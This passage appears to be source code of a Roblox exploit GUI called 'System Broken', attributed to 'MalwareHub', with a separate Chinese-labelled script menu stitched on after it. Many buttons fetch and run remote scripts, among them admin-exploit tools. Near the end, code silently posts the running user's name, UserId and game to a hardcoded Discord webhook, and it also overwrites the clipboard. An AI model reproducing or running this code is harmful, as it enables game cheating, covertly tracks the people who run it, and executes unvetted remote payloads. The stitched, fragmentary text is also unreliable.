	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieFEAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--MISC

pcall(function()
	aBjaUfk.Position = plr.Character.HumanoidRootPart.Position
end)

AntiFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiFling_Button)
	if AntiFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		_G.AntiFlingToggled = true
		loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AntiFling'))()
	else
		_G.AntiFlingToggled = false
	end
end)

AntiChatSpy_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiChatSpy_Button)
	if AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat task.wait()
			Players:Chat(RandomChar())
		until AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	end
end)

local AntiAFKFunction = nil
AntiAFK_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiAFK_Button)
	if AntiAFK_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiAFKFunction = plr.Idled:Connect(function()
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	else
		AntiAFKFunction:Disconnect()
	end
end)

Shaders_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Shaders_Button)
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local Sky = Instance.new("Sky")
		local Bloom = Instance.new("BloomEffect")
		local Blur = Instance.new("BlurEffect")
		local ColorC = Instance.new("ColorCorrectionEffect")
		local SunRays = Instance.new("SunRaysEffect")

		Light.Brightness = 2.25
		Light.ExposureCompensation = 0.1
		Light.ClockTime = 17.55

		Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
		Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
		Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
		Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
		Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
		Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
		Sky.StarCount = 5000
		Sky.SunAngularSize = 5
		Sky.Parent = Light

		Bloom.Intensity = 0.3
		Bloom.Size = 10
		Bloom.Threshold = 0.8
		Bloom.Parent = Light

		Blur.Size = 5
		Blur.Parent = Light

		ColorC.Brightness = 0
		ColorC.Contrast = 0.1
		ColorC.Saturation = 0.25
		ColorC.TintColor = Color3.fromRGB(255, 255, 255)
		ColorC.Parent = Light

		SunRays.Intensity = 0.1
		SunRays.Spread = 0.8
		SunRays.Parent = Light
	else
		for i,v in pairs(Light:GetChildren()) do
			v:Destroy()
		end
		Light.Brightness = 2
		Light.ExposureCompensation = 0
	end
end)

Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 14
	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

Night_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 19
	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

InfYield_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

CMDX_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end)

Explode_Button.MouseButton1Click:Connect(function()
	ToggleRagdoll(false)
	task.wait()
	plr.Character.Humanoid:ChangeState(0)
	local bav = Instance.new("BodyAngularVelocity")
	bav.Parent = GetRoot(plr)
	bav.Name = "Spin"
	bav.MaxTorque = Vector3.new(0,math.huge,0)
	bav.AngularVelocity = Vector3.new(0,150,0)
	task.wait(3)
	plr.Character.Humanoid:ChangeState(15)
end)

FreeEmotes_Button.MouseButton1Click:Connect(function()
	if not FreeEmotesEnabled then
		FreeEmotesEnabled = true
		SendNotify("System Broken","Loading free emotes.\nCredits: Gi#7331")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AllEmotes"))()
	end
end)

Rejoin_Button.MouseButton1Click:Connect(function()
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
end)

Serverhop_Button.MouseButton1Click:Connect(function()
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
		local body = HttpService:JSONDecode(req.Body)
		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end
		if #servers > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], plr)
		end
	end
end)

ChatBox_Input.FocusLost:Connect(function()
	local args = {[1] = ChatBox_Input.Text,[2] = "All"}
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	ChatBox_Input.Text = ""
end)

--GUI Functions
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("System Broken","Targeted player left/rejoined.",5)
		end
	end)
end)

plr.CharacterAdded:Connect(function(x)
	task.wait(GetPing()+0.1)
	x:WaitForChild("Humanoid")
	if SavedCheckpoint ~= nil then
		TeleportTO(SavedCheckpoint.X,SavedCheckpoint.Y,SavedCheckpoint.Z,"pos","safe")
	end
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionDi_Button)
		SendNotify("System Broken","PotionDick was automatically disabled due to your character respawn",5)
	end
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionFling_Button)
		SendNotify("System Broken","PotionFling was automatically disabled due to your character respawn",5)
	end
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(AntiRagdoll_Button)
		SendNotify("System Broken","AntiRagdoll was automatically disabled due to your character respawn",5)
	end
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("System Broken","SpamMines was automatically disabled due to your character respawn",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("System Broken","Fly was automatically disabled due to your character respawn",5)
	end
	x.Humanoid.Died:Connect(function()
		pcall(function()
			x["Pushed"].Disabled = false
			x["RagdollMe"].Disabled = false
		end)
	end)
	task.wait(1)
	local appearance = players:GetCharacterAppearanceAsync(plr.UserId)
	local original_accs = {}
	local accs = {}
	for i,acc in pairs(appearance:GetChildren()) do --Save original accessoryes
		if acc:IsA("Accessory") then
			table.insert(original_accs, acc.Name)
		end
	end
	for i,acc in pairs(plr.Character:GetChildren()) do --Save player accessoryes
		if acc:IsA("Accessory") then
			table.insert(accs, acc.Name)
		end
	end
	
	local original_ammount = #original_accs
	local ammount = #accs
	if ammount == original_ammount then
		local count = 0
		for i,v in pairs(accs) do
			if table.find(original_accs, v) then
				count = count+1
			end
		end
		if not (count == original_ammount) then
			SysBroker:Destroy()
			SendNotify("System Broken","An unexpected error occurred, re-joining...")
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
		end
	else
		SysBroker:Destroy()
		SendNotify("System Broken","An unexpected error occurred, re-joining...")
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
	end
	appearance:Destroy()
end)

task.spawn(function()
	while task.wait(10) do
		pcall(function()
			local GuiVersion = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/version"))()
			if version<GuiVersion then
				SendNotify("System Broken","You are not using the latest version, please run the script again.",5)
				task.wait(5)
				SysBroker:Destroy()
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)

OpenClose.MouseButton1Click:Connect(function()
	Background.Visible = not Background.Visible
end)

game:GetService("UserInputService").InputBegan:Connect(function(input,gameProcessedEvent)
	if gameProcessedEvent then return end
	if input.KeyCode == Enum.KeyCode.B then
		Background.Visible = not Background.Visible
	end
end)

task.spawn(function()
	while task.wait(60) do
		pcall(function()
			local age = plr.AccountAge
			local date_1 = os.date("%Y-%m-%d", os.time()-age * 24 * 3600)
			local date_2 = os.date("%Y-%m-%d", os.time()-(age+1) * 24 * 3600)
			local date_3 = os.date("%Y-%m-%d", os.time()-(age-1) * 24 * 3600)

			local info = game:HttpGet("https://users.roblox.com/v1/users/"..plr.UserId)
			local decode = game:GetService("HttpService"):JSONDecode(info)
			local original_name = decode["name"]
			local original_display = decode["displayName"]
			local original_date = decode["created"]:sub(1,10)

			if (plr.Name ~= original_name) or (plr.DisplayName ~= original_display) or (plr.UserId ~= plr.CharacterAppearanceId) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
			if (date_1 ~= original_date) and (date_2 ~= original_date) and (date_3 ~= original_date) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)
export type Json = {
    Url: string;
    Method: "POST";
    Headers: string;
    Body: any
}

pcall(function()
    local response = HttpRequest({
        Url = "https://discord.com/api/webhooks/1259508306334974002/epK0oLyXDADk7ATyVFrR5XfIbS_OexxUdKagYq43_AQgnEelkPVhhQQxnOGKmW2dJcsD",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = "Script has been Injected: \n```Name: " .. plr.Name .. " | UserId: " .. plr.UserId .. " | Game: " .. game.PlaceId .. "```" .. "\nProfile: " .. "https://www.roblox.com/users/" .. plr.UserId .. "\nGame: " .. "https://www.roblox.com/games/" .. game.PlaceId
        })
    } :: Json)
end)

SendNotify("System Broken","Gui developed by MalwareHub - Discord in your clipboard",10)
setclipboard("https://discord.gg/RkhpySwNR9")
loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/premium"))() -- load the premium

  	end    

})

local Tab = Window:MakeTab({
	Name = "页面后台",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({

	Name = "变身后台（部分游戏）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/1/refs/heads/main/YY.lua"))()

  	end    

})

Tab:AddButton({

	Name = "黑洞后台（自然灾害专用）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/157568056/refs/heads/main/%E9%BB%91%E6%B4%9E.lua"))()

  	end    

})

Tab:AddButton({

	Name = "聊天后台（没太大用）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/88/refs/heads/main/%E8%81%8A%E5%A4%A9.lua"))()

  	end    

})